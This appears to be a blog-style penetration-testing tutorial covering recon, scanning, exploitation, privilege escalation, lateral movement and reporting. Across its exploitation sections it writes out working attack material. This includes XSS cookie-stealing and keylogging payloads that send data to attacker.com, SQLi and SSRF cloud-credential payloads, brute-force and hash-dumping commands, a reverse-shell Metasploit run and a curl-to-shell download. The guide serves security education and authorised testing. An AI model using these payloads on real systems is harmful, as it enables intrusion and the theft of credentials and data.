+++
date = '2024-04-25T12:00:00+00:00'
draft = false
title = 'Ethical Hacking and Penetration Testing'
tags = ['Security', 'Ethical Hacking', 'Penetration Testing', 'Cybersecurity']
summary = "Reference covering methodology, tools and reasoning."
+++

---

## How to Read This Guide

Each phase explains **what** you are doing, **why** it matters, and **how** to do it with real commands. The goal is not just to run tools — it is to understand what you are looking for and why attackers care about it too.

---

## Part 0 — Foundational Concepts

## How Attacks Actually Work: The Kill Chain

Before learning defence or offence, understand the attack model. Lockheed Martin's **Cyber Kill Chain** is the classic framework — every real-world attack follows these steps in order:

```text
1. Reconnaissance    → attacker learns about you
2. Weaponisation     → attacker builds/selects an exploit
3. Delivery          → exploit is sent (phishing, exposed port, etc.)
4. Exploitation      → vulnerability is triggered
5. Installation      → malware/backdoor is planted
6. C2 (Command & Control) → attacker maintains access
7. Actions on Objective    → data theft, ransomware, lateral move
```

**Why this matters for you:** Penetration testing simulates steps 1–5. Your job is to find where the chain can be broken before a real attacker gets there.

## The Three Security Concepts Everything Else Derives From

| Concept             | Meaning                                 | Example Attack                            |
| ------------------- | --------------------------------------- | ----------------------------------------- |
| **Confidentiality** | Data only visible to authorised parties | Data breach, SQLi dumping DB              |
| **Integrity**       | Data cannot be tampered with            | MITM altering requests, XSS modifying DOM |
| **Availability**    | System is up and accessible             | DDoS, ransomware                          |

Every vulnerability you find will damage one or more of these. Always frame findings in these terms when reporting.

## Network Fundamentals You Must Know

**OSI Model (attacks map to these layers):**

```text
Layer 7 — Application   → HTTP, DNS, SMTP (XSS, SQLi, SSRF live here)
Layer 6 — Presentation  → SSL/TLS (cert attacks, weak ciphers)
Layer 5 — Session       → session tokens, cookies (session hijack)
Layer 4 — Transport     → TCP/UDP, ports (port scanning, SYN flood)
Layer 3 — Network       → IP, routing (IP spoofing, ICMP attacks)
Layer 2 — Data Link     → MAC, ARP (ARP poisoning, MAC flooding)
Layer 1 — Physical      → cables, hardware (beyond most pentest scope)
```

**Ports you must know by memory:**

| Port      | Protocol       | Why attackers target it                  |
| --------- | -------------- | ---------------------------------------- |
| 21        | FTP            | Often anonymous login, cleartext creds   |
| 22        | SSH            | Brute force, weak keys                   |
| 23        | Telnet         | Cleartext — replace with SSH immediately |
| 25        | SMTP           | Email relay abuse, user enumeration      |
| 53        | DNS            | Zone transfer leaks full network map     |
| 80/443    | HTTP/HTTPS     | Web app attacks (entire OWASP Top 10)    |
| 139/445   | SMB            | EternalBlue (MS17-010), pass-the-hash    |
| 3306      | MySQL          | Direct DB access if exposed              |
| 3389      | RDP            | Brute force, BlueKeep (CVE-2019-0708)    |
| 5432      | PostgreSQL     | Direct DB access                         |
| 6379      | Redis          | No-auth default, RCE possible            |
| 8080/8443 | Alt HTTP/HTTPS | Dev servers, admin panels                |
| 27017     | MongoDB        | No-auth default, full DB exposed         |

---

## Part 1 — Prerequisites and Scoping

### Rules of Engagement (RoE) Must Cover

```text
- Authorised IP ranges and domains (exact list)
- Out-of-scope systems (e.g. third-party payment processor)
- Permitted techniques (e.g. "no DoS attacks", "no social engineering")
- Testing windows (e.g. "only 9pm–6am AEST")
- Emergency escalation contact (if you accidentally break something)
- Data handling (what to do if you find real PII or credentials)
- Reporting deadline and format
```

## Pen Test Types

| Type          | Prior Knowledge                | Simulates                        | Best For                  |
| ------------- | ------------------------------ | -------------------------------- | ------------------------- |
| **Black box** | None                           | External attacker                | External perimeter review |
| **Grey box**  | Credentials, architecture docs | Insider threat, compromised user | Web app + API testing     |
| **White box** | Full source code, infra access | Developer / DevSecOps review     | Deep code + config audit  |

**As a developer testing your own app:** Grey box is most practical. You already know the stack. Use that knowledge to inform your testing, not skip steps.

---

## Part 2 — Phase 1: Reconnaissance (Passive)

## What and Why

Passive recon means gathering intelligence without sending a single packet to your target. Everything here uses publicly available information. This is legal everywhere, even without authorization, but in a pentest context it is used to map the attack surface before active scanning begins.

**Why attackers spend most time here:** The more you know before attacking, the more targeted and effective your attacks become. A good attacker can identify the exact version of software running on a server from public DNS and certificate data alone — then search for known CVEs for that version.

**What you are looking for:**

- Subdomains (each is a potential entry point)
- Technology stack (framework, server, CDN, CMS)
- Exposed services (S3 buckets, dev environments, staging servers)
- Employee emails (for phishing, credential stuffing)
- Historical data (old endpoints, leaked credentials in GitHub)

## DNS Enumeration

DNS is the internet's phone book. Misconfigured DNS can leak the entire internal network structure.

```bash
# Basic lookup — A record (IP), MX (mail), TXT (SPF, DKIM, verification tokens)
nslookup target.com
dig target.com ANY       # all record types
dig target.com MX        # mail servers (useful for phishing simulation)
dig target.com TXT       # often reveals cloud services in use

# Zone transfer — if the DNS server is misconfigured, dumps ALL records
# This is a critical misconfiguration — should always be disabled
dig axfr @ns1.target.com target.com

# Automated DNS enumeration with dnsx
dnsx -d target.com -a -cname -mx -txt -resp
```

**What a zone transfer reveals:** Every internal hostname, IP, mail server, and subdomains — essentially a full map of the infrastructure. Real attackers check this first.

## Subdomain Enumeration

Every subdomain is a separate application, often less well-maintained than the primary domain. `dev.target.com`, `staging.target.com`, `admin.target.com`, `api.target.com` are all common high-value targets.

```bash
# subfinder — queries passive sources (VirusTotal, Shodan, crt.sh, etc.)
subfinder -d target.com -all -o subdomains.txt

# amass — more aggressive, more sources
amass enum -passive -d target.com

# Certificate Transparency logs — every SSL cert ever issued is public
# This is one of the most reliable subdomain sources
curl "https://crt.sh/?q=%25.target.com&output=json" | jq -r '.[].name_value' | sort -u

# DNS brute force — tries common names (api, dev, mail, admin, staging...)
dnsx -d target.com -w /usr/share/wordlists/dns/subdomains-top1million.txt
```

**Why crt.sh is reliable:** Certificate Transparency is a legal requirement for CAs (Certificate Authorities). Every SSL cert issued is logged publicly. Attackers use this to find subdomains that have never been publicly advertised.

## Technology Stack Fingerprinting

Knowing what software a target runs lets you search for known vulnerabilities for exact versions.

```bash
# whatweb — identifies CMS, framework, server, plugins from HTTP response
whatweb https://target.com
whatweb -v https://target.com   # verbose, shows raw evidence

# curl headers — server version often leaked here
curl -I https://target.com
# Look for: Server, X-Powered-By, X-Generator headers

# Wappalyzer — browser extension, gives instant stack breakdown
# Identifies React, Angular, WordPress, Shopify, Cloudflare, etc.
```

**What to note:** Server version (`nginx/1.18.0`), framework (`X-Powered-By: PHP/7.4.3`), CMS (`X-Generator: WordPress 6.1`). Then search `nginx 1.18.0 CVE` on nvd.nist.gov.

## Google Dorks

Google has indexed parts of the internet that organisations did not intend to be public. Google dorks are search queries that exploit this.

```bash
# Find exposed environment files (contain API keys, DB passwords)
site:target.com filetype:env
site:target.com filetype:config
site:target.com filetype:xml inurl:config

# Find admin panels
site:target.com inurl:admin
site:target.com inurl:dashboard
site:target.com inurl:wp-admin

# Find directory listings (server misconfiguration)
site:target.com "index of /"
site:target.com "index of" inurl:backup

# Find login pages
site:target.com inurl:login
site:target.com inurl:signin

# Find exposed logs, backups, databases
site:target.com filetype:log
site:target.com filetype:sql
site:target.com filetype:bak
```

**Wider OSINT sources:**

- **Shodan** (`shodan.io`) — search engine for internet-connected devices. Finds open ports, banners, default creds on routers/cameras/industrial systems without touching the target.
- **theHarvester** — scrapes emails, IPs, hostnames from Google, Bing, LinkedIn, Twitter
- **GitHub** (`github.com/search`) — search for `org:target.com password` or `org:target.com api_key` — developers accidentally commit secrets constantly

```bash
# theHarvester
theHarvester -d target.com -b google,linkedin,bing -l 500

# Shodan CLI
shodan search "hostname:target.com"
shodan search "org:\"Target Company\" port:22"
```

---

## Part 3 — Phase 2: Scanning (Active)

## What and Why

Active scanning sends traffic to the target. You are now interacting with their systems — this requires authorisation. The goal is to enumerate every open port, service, version, and potential misconfiguration.

**Why this matters:** You cannot attack what you cannot see. Scanning builds the complete map of exposed attack surface. Every open port is a potential entry point. Every service version is a potential CVE.

## Network Scanning with Nmap

Nmap (Network Mapper) is the industry-standard tool. It works by sending crafted packets and analysing responses to determine what is running and what version.

```bash
# Step 1 — Host discovery (is this host alive?)
nmap -sn 192.168.1.0/24        # ICMP ping sweep, no port scan
nmap -sn -PE 192.168.1.0/24    # ICMP echo only

# Step 2 — Fast scan (most common ports only)
nmap -T4 -F target.com          # Top 100 ports, fast timing

# Step 3 — Full comprehensive scan (use this in practice)
nmap -sV -sC -O -p- -T4 target.com -oA output/target_full
# -sV   probe open ports for service/version info
# -sC   run default NSE (Nmap Scripting Engine) scripts — checks for common vulns
# -O    OS fingerprinting
# -p-   scan ALL 65535 ports (not just top 1000)
# -T4   aggressive timing (T1=slow/stealthy, T5=fastest/noisy)
# -oA   save output in all 3 formats: .nmap .xml .gnmap

# Step 4 — Targeted script scans
nmap --script=http-headers,http-title target.com       # web server info
nmap --script=ssh-auth-methods target.com -p 22        # what SSH auth is allowed
nmap --script=ftp-anon target.com -p 21                # anonymous FTP check
nmap --script=smb-vuln-ms17-010 target.com -p 445     # EternalBlue check
nmap --script=vuln target.com                           # all vuln scripts (slow, noisy)
nmap --script=dns-zone-transfer target.com -p 53       # DNS zone transfer
```

**Understanding output:**

```text
PORT     STATE  SERVICE  VERSION
22/tcp   open   ssh      OpenSSH 7.6p1 Ubuntu
80/tcp   open   http     Apache httpd 2.4.29
443/tcp  open   ssl/http Apache httpd 2.4.29
3306/tcp open   mysql    MySQL 5.7.38
```

This tells you: SSH is running (brute force candidate), Apache version (search CVEs), MySQL is exposed to the network (critical misconfiguration — databases should never be internet-facing).

## Web Application Scanning

Web app scanning is distinct from network scanning — it works at Layer 7, understanding HTTP.

```bash
# Nikto — basic web scanner, checks for 6700+ known issues
# Checks: default files, dangerous HTTP methods, outdated headers, common vulns
nikto -h https://target.com
nikto -h https://target.com -ssl -port 443
nikto -h https://target.com -o nikto_output.txt -Format txt

# Nuclei — template-based scanner, best for CVE detection at scale
# Templates are community-maintained YAML files, each tests one specific thing
nuclei -u https://target.com -t cves/ -t exposures/ -t misconfiguration/
nuclei -u https://target.com -t cves/ -severity critical,high
nuclei -u https://target.com -t technologies/   # detect tech stack
nuclei -l urls.txt -t cves/                      # scan a list of targets

# Directory and file discovery — find hidden endpoints
# gobuster uses wordlists to try thousands of paths
gobuster dir -u https://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,js,json,txt
gobuster dir -u https://target.com -w /usr/share/seclists/Discovery/Web-Content/common.txt -o gobuster_output.txt

# ffuf — faster and more flexible fuzzer
ffuf -u https://target.com/FUZZ -w wordlist.txt               # path fuzzing
ffuf -u https://target.com/api/FUZZ -w api-endpoints.txt      # API endpoint discovery
ffuf -u https://target.com/page?id=FUZZ -w numbers.txt        # parameter fuzzing
ffuf -u https://target.com/ -H "Host: FUZZ.target.com" -w subdomains.txt  # vhost fuzzing

# feroxbuster — recursive discovery (follows found directories automatically)
feroxbuster -u https://target.com -w wordlist.txt --depth 3
```

**What to look for in results:**

- `200 OK` — endpoint exists and is accessible
- `301/302` — redirect (may reveal internal path structure)
- `401` — exists but requires auth (authentication target)
- `403` — exists but you are forbidden (bypass candidate)
- `500` — server error (often indicates you hit something sensitive)

---

## Part 4 — Phase 3: Vulnerability Classification

## The Frameworks

### OWASP Top 10 — Web Application Vulnerabilities

OWASP (Open Web Application Security Project) publishes the 10 most critical web vulnerabilities. This is the universal reference for web app security. Every web application assessment starts here.

| ID      | Vulnerability               | What It Means                                                 | Common Cause                                                | Example                                                               |
| ------- | --------------------------- | ------------------------------------------------------------- | ----------------------------------------------------------- | --------------------------------------------------------------------- |
| **A01** | Broken Access Control       | Users can access resources/actions they should not            | Missing authorisation checks                                | User A views User B's profile by changing `?id=2` to `?id=3` (IDOR)   |
| **A02** | Cryptographic Failures      | Sensitive data exposed due to weak/missing encryption         | MD5/SHA1 for passwords, HTTP instead of HTTPS, keys in code | Password reset token predictable, PII stored in plaintext             |
| **A03** | Injection                   | Untrusted data sent to an interpreter as a command            | No input sanitisation                                       | `' OR 1=1--` in login form dumps entire user table                    |
| **A04** | Insecure Design             | Architectural flaws that no implementation fix can solve      | No threat modelling, no security requirements               | Password reset via easily-guessed security questions                  |
| **A05** | Security Misconfiguration   | Default configs, unnecessary features enabled, verbose errors | Lazy deployment, no hardening                               | Stack trace revealed in 500 error, default admin/admin credentials    |
| **A06** | Vulnerable Components       | Using libraries/frameworks with known CVEs                    | Outdated dependencies                                       | log4j 2.14 with Log4Shell (CVE-2021-44228) in production              |
| **A07** | Auth Failures               | Broken authentication lets attackers assume other identities  | Weak session management, no MFA, credential stuffing        | JWT with `alg:none`, session token not invalidated on logout          |
| **A08** | Software Integrity Failures | Untrusted code or updates executed                            | No signature verification                                   | npm package with malicious update, insecure CI/CD pipeline            |
| **A09** | Logging Failures            | Attacks go undetected, forensics impossible                   | No audit trail, logging passwords                           | Failed login attempts not logged, no alerts on privilege escalation   |
| **A10** | SSRF                        | Server makes requests to attacker-controlled URLs             | User-controlled URLs passed to server-side HTTP clients     | `?url=http://169.254.169.254/latest/meta-data/` leaks AWS credentials |

### OWASP API Security Top 10

APIs have their own distinct vulnerability class — critical for developers:

| ID        | Vulnerability                                   | Example                                                             |
| --------- | ----------------------------------------------- | ------------------------------------------------------------------- |
| **API1**  | Broken Object Level Auth                        | `GET /api/orders/1234` — change 1234 to any number                  |
| **API2**  | Broken Authentication                           | JWT secret is "secret", tokens never expire                         |
| **API3**  | Broken Object Property Level Auth               | Response includes `isAdmin: false` — try sending `isAdmin: true`    |
| **API4**  | Unrestricted Resource Consumption               | No rate limiting on `/api/send-email`, `/api/sms`                   |
| **API5**  | Broken Function Level Auth                      | Regular user calls `DELETE /api/admin/users/5`                      |
| **API6**  | Unrestricted Access to Sensitive Business Flows | Unlimited coupon redemption, account enumeration via password reset |
| **API7**  | SSRF                                            | API fetches external URLs based on user input                       |
| **API8**  | Security Misconfiguration                       | CORS allows `*`, debug mode on, verbose errors                      |
| **API9**  | Improper Inventory Management                   | Forgot old `/api/v1/` endpoint still live and unpatched             |
| **API10** | Unsafe Consumption of APIs                      | App trusts third-party API response without validation              |

### CVE and CVSS

**CVE (Common Vulnerabilities and Exposures):** Every publicly known vulnerability gets a unique identifier. Format: `CVE-YEAR-NUMBER` (e.g. `CVE-2021-44228`).

**CVSS v3 (Common Vulnerability Scoring System):** Standardised 0–10 severity score. The score is calculated from multiple factors:

```
Attack Vector (AV):     Network / Adjacent / Local / Physical
Attack Complexity (AC): Low / High
Privileges Required (PR): None / Low / High
User Interaction (UI):  None / Required
Scope (S):              Unchanged / Changed
Confidentiality (C):    None / Low / High
Integrity (I):          None / Low / High
Availability (A):       None / Low / High
```

| CVSS Score | Severity          | Action                                  |
| ---------- | ----------------- | --------------------------------------- |
| 9.0–10.0   | **Critical**      | Fix immediately, escalate to management |
| 7.0–8.9    | **High**          | Fix within days                         |
| 4.0–6.9    | **Medium**        | Fix within sprint                       |
| 0.1–3.9    | **Low**           | Fix in backlog                          |
| 0.0        | **Informational** | Document, review policy                 |

**Where to look up CVEs:**

- `https://nvd.nist.gov` — NIST National Vulnerability Database (authoritative)
- `https://www.cvedetails.com` — more user-friendly, searchable by product
- `https://exploit-db.com` — CVEs with working exploit code

### CWE (Common Weakness Enumeration)

CWE is the **root cause** classification — the type of coding mistake. CVE is an instance; CWE is the pattern.

| CWE     | Weakness                          | Common CVEs                            |
| ------- | --------------------------------- | -------------------------------------- |
| CWE-79  | Cross-Site Scripting (XSS)        | Reflected, stored, DOM-based           |
| CWE-89  | SQL Injection                     | Any unsanitised SQL query              |
| CWE-22  | Path Traversal                    | `../../etc/passwd`                     |
| CWE-78  | OS Command Injection              | `; ls -la` injected into shell command |
| CWE-287 | Improper Authentication           | Weak session tokens, JWT bypass        |
| CWE-200 | Exposure of Sensitive Information | Stack traces, verbose errors           |
| CWE-352 | CSRF                              | Cross-site request forgery             |
| CWE-918 | SSRF                              | Server-side request forgery            |
| CWE-611 | XXE                               | XML external entity injection          |

---

## Part 5 — Phase 4: Exploitation

## What and Why

Exploitation proves that a vulnerability is real and exploitable — not just theoretically present. The purpose is to demonstrate impact to stakeholders. You are not trying to cause damage; you are trying to show what a real attacker could achieve.

**Key principle:** Stop at proof of access. You do not need to dump the entire database to prove SQLi is real — one record of PII is sufficient evidence and far less risky.

## Burp Suite — Your Primary Web App Tool

Burp Suite is the central tool for all web application testing. It acts as a proxy between your browser and the target, letting you intercept, inspect, and modify every HTTP/S request and response in real time.

**Setup:**

```
1. Launch Burp Suite
2. Go to Proxy → Options → confirm listener on 127.0.0.1:8080
3. Configure browser to use proxy 127.0.0.1:8080
   (Use FoxyProxy extension for quick toggle)
4. Visit http://burpsuite in browser → download CA cert
5. Install CA cert in browser trust store (so HTTPS doesn't error)
6. Turn on Intercept → browse target → requests appear in Burp
```

**Core Burp modules:**

| Module            | Purpose                              | How to Use                                                    |
| ----------------- | ------------------------------------ | ------------------------------------------------------------- |
| **Proxy**         | Intercept all HTTP/S traffic         | Browse normally, every request is captured                    |
| **Repeater**      | Manually send/modify single requests | Right-click request → Send to Repeater → modify and replay    |
| **Intruder**      | Automated fuzzing and brute force    | Mark payload positions with `§`, set payload list, run attack |
| **Scanner** (Pro) | Automated vulnerability detection    | Right-click → Scan, or run active scan on whole site          |
| **Decoder**       | Encode/decode base64, URL, hex, JWT  | Paste token → auto-detect and decode                          |
| **Comparer**      | Diff two requests/responses          | Highlight subtle differences between similar responses        |
| **Logger**        | Full request history                 | Review everything sent during a session                       |

**Practical Burp workflow for an API:**

```text
1. Browse every endpoint in your app with Burp intercepting
2. Review all requests in HTTP History
3. Look for: JWTs in headers, session cookies, IDOR patterns in IDs
4. Send interesting requests to Repeater
5. Modify: change user IDs, remove auth headers, alter role parameters
6. Observe: does the server enforce access control?
```

## SQL Injection (SQLi)

SQL injection occurs when user input is inserted into a SQL query without sanitisation. The attacker can alter the query logic.

**Manual testing — always try these first:**

```text
'                          → syntax error means SQL is reflected
' OR 1=1--                 → bypass login (returns first row)
' OR '1'='1               → alternate bypass
admin'--                   → comment out password check
' UNION SELECT null--      → start UNION-based extraction
```

**sqlmap — automated SQLi:**

```bash
# Basic detection
sqlmap -u "https://target.com/product?id=1"

# Enumerate databases (when injection confirmed)
sqlmap -u "https://target.com/product?id=1" --dbs

# Enumerate tables in a database
sqlmap -u "https://target.com/product?id=1" -D target_db --tables

# Dump a specific table
sqlmap -u "https://target.com/product?id=1" -D target_db -T users --dump

# POST request injection (use Burp to copy the raw request)
sqlmap -r request.txt -p username --level 3 --risk 2

# Cookie-based injection
sqlmap -u "https://target.com/" --cookie="session=abc123; user=1" -p user

# Common flags:
# --level 1-5     how many payloads to try (default 1)
# --risk 1-3      how aggressive (3 may modify data)
# --dbs           enumerate databases
# --batch         no interactive prompts
# --random-agent  rotate user-agent to avoid detection
```

**SQLi types:**

- **Error-based:** Database error message reveals data — direct and obvious
- **Boolean-based blind:** Ask true/false questions (`' AND 1=1--` vs `' AND 1=2--`) — different responses reveal data bit by bit
- **Time-based blind:** Inject `SLEEP(5)` — if response delays, injection works
- **UNION-based:** Append a SELECT to the original query — most powerful, dumps entire tables

## Cross-Site Scripting (XSS)

XSS injects JavaScript into a page that executes in another user's browser. It steals cookies, redirects users, or performs actions on their behalf.

**Manual payloads:**

```javascript
// Basic test — does JS execute?
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
"><script>alert(1)</script>

// Steal session cookie (send to attacker server)
<script>document.location='https://attacker.com/steal?c='+document.cookie</script>

// Keylogger
<script>document.onkeypress=function(e){fetch('https://attacker.com/log?k='+e.key)}</script>
```

**XSS types:**

- **Reflected:** Payload in URL parameter, reflected in response — affects whoever clicks the crafted link
- **Stored (Persistent):** Payload saved in database (comment, username), served to all users — most dangerous
- **DOM-based:** JavaScript on the page writes attacker-controlled data to the DOM — no server interaction needed

**Testing with Burp:** Send every input field through Repeater with XSS payloads. Check if the payload appears in the response unescaped.

## Authentication and Session Attacks

**JWT (JSON Web Token) attacks:**

```bash
# JWT structure: header.payload.signature (base64 encoded)
# Decode at jwt.io

# Attack 1: Algorithm confusion — change alg to "none"
# Forge a token with no signature required
eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.

# Attack 2: Weak secret brute force
hashcat -a 0 -m 16500 jwt_token.txt wordlist.txt

# Attack 3: RS256 to HS256 confusion
# If server uses RS256, try signing with public key as HS256 secret
```

**Session token analysis:**

```bash
# Collect 10+ session tokens, check for patterns
# Base64 decode them — are they sequential? Timestamp-based? Predictable?
echo "c2Vzc2lvbjoxMjM0NTY=" | base64 -d
# Output: session:123456 — predictable! Can enumerate other sessions
```

**Credential attacks with Hydra:**

```bash
# HTTP POST login form brute force
hydra -L users.txt -P passwords.txt target.com \
  http-post-form "/login:username=^USER^&password=^PASS^:Invalid credentials"

# SSH brute force
hydra -l admin -P passwords.txt ssh://target.com

# HTTP Basic Auth
hydra -L users.txt -P passwords.txt target.com http-get /admin/

# Common flags:
# -L  usernames list    -l  single username
# -P  passwords list    -p  single password
# -t  threads (default 16)
# -f  stop after first success
```

**Default credentials to always try:**

```text
admin:admin
admin:password
admin:123456
root:root
root:toor
administrator:administrator
guest:guest
```

## SSRF (Server-Side Request Forgery)

SSRF makes the server issue HTTP requests on your behalf. Because the request comes from the server, it can reach internal services that you cannot access directly.

**Common injection points:**

```text
?url=
?redirect=
?next=
?image=
?fetch=
?src=
Webhook URLs, avatar URLs, PDF generators, link preview generators
```

**Attack payloads:**

```bash
# Cloud metadata — leaks IAM credentials in AWS, GCP, Azure
# AWS
?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
?url=http://169.254.169.254/latest/user-data

# GCP
?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# Azure
?url=http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01

# Internal network probing
?url=http://192.168.1.1/            # router
?url=http://localhost:8080/admin    # internal admin
?url=http://10.0.0.5:6379/         # internal Redis

# Protocol abuse
?url=file:///etc/passwd            # local file read
?url=dict://localhost:6379/info    # Redis info via DICT protocol
```

## Password Cracking

Offline cracking is performed on password hashes you have already obtained (e.g. from a database dump). You are not attacking the server — you are running computations locally.

**Identify hash type:**

```bash
hashid hash.txt
hash-identifier "5f4dcc3b5aa765d61d8327deb882cf99"  # MD5 = "password"
```

**Hashcat modes:**

```bash
# -m flag specifies hash type
# -a flag specifies attack mode (0=wordlist, 3=brute force, 6=hybrid)

# MD5
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt

# SHA1
hashcat -m 100 hashes.txt rockyou.txt

# bcrypt (slow by design — use targeted wordlists)
hashcat -m 3200 hashes.txt rockyou.txt

# NTLM (Windows)
hashcat -m 1000 hashes.txt rockyou.txt

# WPA2 (WiFi)
hashcat -m 2500 handshake.hccapx rockyou.txt

# Rule-based attack (mutates wordlist: adds numbers, capitalises, etc.)
hashcat -m 0 hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Brute force all 6-char alphanumeric
hashcat -m 0 hashes.txt -a 3 ?a?a?a?a?a?a
```

**Common wordlists:**

```
rockyou.txt                                    # 14M common passwords
SecLists/Passwords/                            # collection of specialised lists
/usr/share/wordlists/                          # Kali default location
cewl https://target.com -w custom.txt          # generate wordlist from target website
```

## Exploitation Framework: Metasploit

Metasploit is a framework for using known exploits against systems with known CVEs. As a developer testing your own app, you will use it less than Burp, but it is essential for infrastructure testing.

```bash
msfconsole                          # launch
search apache 2.4.49                # find exploits for a version
search type:exploit cve:2021-44228  # search by CVE
use exploit/multi/http/log4shell_header_injection

# Once a module is selected:
show options                        # see required parameters
set RHOSTS target.com               # set target
set RPORT 8080                      # set target port
set LHOST attacker.com              # your IP (for reverse shell)
run                                 # execute

# Common post-exploitation modules
use post/linux/gather/hashdump      # dump /etc/shadow
use post/multi/recon/local_exploit_suggester  # find privesc paths
```

---

## Part 6 — Phase 5: Post-Exploitation

## What and Why

Post-exploitation answers the question: **"If an attacker got in here, how bad could it get?"** This phase assesses the blast radius of a successful compromise. Many organisations fixate on perimeter security but have no internal controls — once inside, everything is accessible.

**What you are assessing:**

- Can you escalate from low-privileged user to root/admin?
- Can you access other machines on the network (lateral movement)?
- Can you access sensitive data: PII, credentials, backups, source code?
- How long could an attacker remain undetected?

## Privilege Escalation (Linux)

Privilege escalation is going from a low-privileged shell (e.g. `www-data`) to `root`. This usually exploits misconfigurations, not software bugs.

```bash
# --- Manual checks ---

# Who am I? What groups?
id
whoami
groups

# What can I run as sudo WITHOUT a password?
sudo -l
# Look for: (ALL) NOPASSWD: /usr/bin/python3  → instant root

# SUID binaries — run as the file owner (often root) regardless of who executes
find / -perm -4000 -type f 2>/dev/null
# Any SUID binary on GTFOBins.github.io? → instant root exploit

# World-writable scripts run by root cron job?
cat /etc/crontab
ls -la /etc/cron.*
# If /opt/backup.sh is run by root and writable by you → add reverse shell

# Sensitive files
cat /etc/passwd          # user list
cat /etc/shadow          # password hashes (readable only by root — if you can read this, you are root)
find / -name "*.conf" 2>/dev/null | xargs grep -l "password"
find / -name ".env" 2>/dev/null

# Kernel version — check for local privilege escalation exploits
uname -a
cat /etc/os-release

# Network — what other hosts are reachable from here?
ip a
ip route
cat /etc/hosts
ss -tulnp         # open ports on this machine

# --- Automated ---
# LinPEAS — most comprehensive, checks hundreds of vectors
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Linux Exploit Suggester
./linux-exploit-suggester.sh
```

**GTFOBins** (`gtfobins.github.io`) — database of Unix binaries that can be abused for privilege escalation, shell escape, and file read/write. If you find any of these in SUID or sudo output, look them up immediately.

## Privilege Escalation (Windows)

```powershell
# Who am I?
whoami
whoami /priv          # token privileges — SeImpersonatePrivilege? → JuicyPotato/PrintSpoofer
net user              # list users
net localgroup administrators

# Services with weak permissions
sc query             # list services
accesschk.exe -uwcqv * /accepteula  # find modifiable services

# Unquoted service paths (common Windows misconfiguration)
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows"

# AlwaysInstallElevated (install MSI as SYSTEM)
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# Credentials in registry
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s

# Automated
.\winpeas.exe
.\PowerUp.ps1
Invoke-AllChecks     # PowerUp function — finds all privesc paths
```

## Lateral Movement Concepts

After compromising one machine, check if you can reach others.

| Technique            | How It Works                                               | Tool                           |
| -------------------- | ---------------------------------------------------------- | ------------------------------ |
| **Pass-the-Hash**    | Use NTLM hash without cracking it                          | `crackmapexec`, `pth-winexe`   |
| **Pass-the-Ticket**  | Reuse Kerberos ticket (golden/silver ticket)               | `mimikatz`, `impacket`         |
| **SSH Key Reuse**    | Private key on one machine works on others                 | Manual `ssh -i key user@host`  |
| **Credential Reuse** | Same password used on multiple systems                     | Spray found credentials        |
| **Pivoting**         | Route traffic through compromised host to internal network | `sshuttle`, Metasploit `route` |

```bash
# CrackMapExec — Swiss army knife for Windows network lateral movement
crackmapexec smb 192.168.1.0/24 -u admin -H ntlm_hash   # pass-the-hash
crackmapexec smb 192.168.1.0/24 -u admin -p password --shares  # enumerate shares
crackmapexec ssh 192.168.1.0/24 -u admin -p password    # spray credentials over SSH

# Impacket suite — Python tools for Windows protocols
python3 secretsdump.py domain/user:pass@target   # dump hashes remotely
python3 psexec.py domain/user:pass@target        # remote shell via SMB
python3 wmiexec.py domain/user:pass@target       # shell via WMI (stealthier)
```

---

## Part 7 — Phase 6: Reporting

## What and Why

The report is the product. Everything else — the scanning, the exploitation, the late nights in a terminal — is work in service of the report. A finding that is not clearly communicated is a finding that will not be fixed.

**A good report answers three questions for every finding:**

1. What is the issue and where exactly is it?
2. What could an attacker do with it?
3. How do you fix it?

## Finding Report Template

```text
Title:          [Concise, specific name — e.g. "SQL Injection in /api/v1/users endpoint"]
Severity:       Critical | High | Medium | Low | Informational
CVSS Score:     9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)
CWE:            CWE-89 — Improper Neutralisation of Special Elements in SQL Command
Affected Asset: https://target.com/api/v1/users?id=

Description:
  The `id` parameter in the user lookup endpoint is passed directly to a SQL query
  without sanitisation. An attacker can manipulate the query to return arbitrary
  database rows, enumerate schemas, or execute system commands.

Steps to Reproduce:
  1. Navigate to https://target.com/api/v1/users?id=1
  2. Modify the request to: ?id=1' OR 1=1--
  3. Observe: all user records returned in response

Evidence:
  [Screenshot of response with all user records]
  [Burp Suite request/response dump]
  curl -s "https://target.com/api/v1/users?id=1' OR 1=1--"

Impact:
  An unauthenticated attacker can read the entire users table, including
  password hashes and PII. On MSSQL, xp_cmdshell could enable OS-level RCE.
  This constitutes a full confidentiality breach under ASD Essential Eight
  and likely triggers GDPR/Privacy Act notification obligations.

Remediation:
  Use parameterised queries / prepared statements. Never concatenate
  user input into SQL strings.

  // Vulnerable
  query = "SELECT * FROM users WHERE id = " + request.params.id

  // Fixed
  query = "SELECT * FROM users WHERE id = ?"
  db.execute(query, [request.params.id])

References:
  https://owasp.org/www-community/attacks/SQL_Injection
  https://cheatsheetseries.owasp.org/cheatsheets/Query_Parameterization_Cheat_Sheet.html
```

## Full Report Structure

```text
1. Cover Page
   - Client name, tester name/company, test dates, document classification

2. Executive Summary (1 page, non-technical)
   - What was tested
   - Overall risk rating
   - Number of findings by severity
   - Top 3 highest-risk findings in plain language
   - Strategic recommendations

3. Scope and Methodology
   - Systems in scope (IPs, domains, environments)
   - Out-of-scope items
   - Test type (black/grey/white box)
   - Testing window
   - Tools used

4. Summary of Findings
   - Table: Finding name | Severity | Affected Asset | Status (Open/Closed)

5. Detailed Findings (one section per finding, using template above)
   - Sorted by severity: Critical → High → Medium → Low → Informational

